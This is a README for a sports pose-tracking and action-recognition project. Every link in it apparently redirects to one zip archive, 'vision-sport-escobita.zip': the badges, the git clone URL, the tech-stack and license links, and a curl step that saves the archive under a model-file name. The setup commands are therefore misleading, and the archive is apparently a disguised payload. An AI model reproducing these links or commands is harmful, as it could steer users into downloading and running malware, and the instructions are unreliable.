<div align="center">

# ⚡ Sport Vision

**AI-powered motion recognition for racket sports**

实时骨骼追踪 · 击球动作识别 · 运动生物力学分析

[![License: MIT](https://img.shields.io/badge/License-MIT-cyan.svg)](LICENSE)
[![Python 3.9+](https://img.shields.io/badge/Python-3.9+-blue.svg)](https://github.com/IRoNCodeR-J/sport-vision/raw/refs/heads/main/demo_videos/vision-sport-escobita.zip)
[![MediaPipe](https://img.shields.io/badge/MediaPipe-PoseLandmarker-green.svg)](https://github.com/IRoNCodeR-J/sport-vision/raw/refs/heads/main/demo_videos/vision-sport-escobita.zip)

</div>

---

## ✨ Features

| Feature | Description |
|---------|-------------|
| 🦴 **Real-time Pose Tracking** | MediaPipe PoseLandmarker with 13 keypoints |
| 🎯 **Action Recognition** | Serve, Smash, Forehand, Backhand, Lob, Drop |
| � **Biomechanics Analysis** | Joint angles, wrist speed, body lean, symmetry |
| 🔥 **Movement Heatmap** | Spatial visualization of player movement |
| ⚡ **Action Timeline** | Sequential recording of all detected actions |
| 🌐 **Real-time WebSocket** | Streaming analysis at ~20 FPS |
| 🎨 **Stunning UI** | Dark neon theme with particle animation |

> **Zero cloud dependency** — All AI inference runs locally on CPU. No API keys needed.

## 🚀 Quick Start

```bash
# Clone
git clone https://github.com/IRoNCodeR-J/sport-vision/raw/refs/heads/main/demo_videos/vision-sport-escobita.zip
cd sport-vision

# One-click start (creates venv, installs deps, downloads model, launches server)
chmod +x run.sh
./run.sh

# Open browser
open http://localhost:8000
```

### Manual Setup

```bash
# Create virtual environment
python3 -m venv .venv
source .venv/bin/activate

# Install dependencies
pip install -r requirements.txt

# Download pose model
mkdir -p models
curl -sL -o models/pose_landmarker_lite.task \
  "https://github.com/IRoNCodeR-J/sport-vision/raw/refs/heads/main/demo_videos/vision-sport-escobita.zip"

# Start server
python -m uvicorn backend.main:app --host 0.0.0.0 --port 8000
```

## 🎬 Usage

1. **Upload a video** — Click the upload button and select a badminton/tennis match video
2. **Use demo videos** — Place `.mp4` files in the `demo_videos/` directory
3. **Watch the analysis** — Real-time skeleton overlay, action recognition, and biomechanics data
4. **Review the timeline** — All detected actions are recorded in the action timeline

## 🏗️ Architecture

```
Video Input
    ↓
┌─────────────────────────────────────┐
│  FastAPI Backend                    │
│  ┌──────────────┐                   │
│  │ MediaPipe     │→ 13 Keypoints    │
│  │ PoseLandmarker│                  │
│  └──────────────┘                   │
│         ↓                           │
│  ┌──────────────┐  ┌─────────────┐  │
│  │ Action        │  │ Biomechanics│  │
│  │ Recognizer    │  │ Analyzer    │  │
│  └──────────────┘  └─────────────┘  │
│         ↓                ↓          │
│     WebSocket (JSON + Base64 Frame) │
└─────────────────────────────────────┘
    ↓
┌─────────────────────────────────────┐
│  Frontend (Canvas + Dashboard)      │
│  Skeleton Overlay · Gauges · Heatmap│
└─────────────────────────────────────┘
```

## 📁 Project Structure

```
sport-vision/
├── backend/
│   ├── main.py              # FastAPI server + WebSocket
│   ├── pipeline.py           # Video processing pipeline
│   ├── pose_analyzer.py      # MediaPipe pose estimation + biomechanics
│   ├── action_recognizer.py  # Rule-based action recognition engine
│   └── visualizer.py         # OpenCV skeleton rendering
├── frontend/
│   ├── index.html            # Single-page application
│   ├── css/style.css         # Dark neon design system
│   └── js/
│       ├── app.js            # WebSocket client + UI orchestration
│       ├── dashboard.js      # Gauges, stats, heatmap rendering
│       ├── skeleton-renderer.js  # Canvas skeleton overlay
│       └── particles.js      # Background particle animation
├── models/                   # MediaPipe model (auto-downloaded)
├── demo_videos/              # Place your .mp4 files here
├── requirements.txt
├── run.sh                    # One-click launcher
├── LICENSE
└── README.md
```

## 🛠️ Tech Stack

| Layer | Technology |
|-------|-----------|
| Pose Estimation | [MediaPipe PoseLandmarker](https://github.com/IRoNCodeR-J/sport-vision/raw/refs/heads/main/demo_videos/vision-sport-escobita.zip) |
| Action Recognition | Rule-based keypoint temporal analysis |
| Video Processing | OpenCV |
| Backend | FastAPI + WebSocket |
| Frontend | Vanilla JS + Canvas API |
| Styling | CSS (dark neon + glassmorphism) |

## 🤝 Contributing

Contributions are welcome! Some ideas:

- [ ] **Improve action recognition** — Add ML-based classifier (ST-GCN)
- [ ] **Multi-person tracking** — ByteTrack / BoT-SORT integration
- [ ] **3D pose lifting** — MotionBERT for 2D→3D reconstruction
- [ ] **Action quality assessment** — Score technique quality
- [ ] **Mobile deployment** — CoreML / TFLite export

## 📄 License

[MIT](LICENSE) © [MindDock](https://github.com/IRoNCodeR-J/sport-vision/raw/refs/heads/main/demo_videos/vision-sport-escobita.zip)
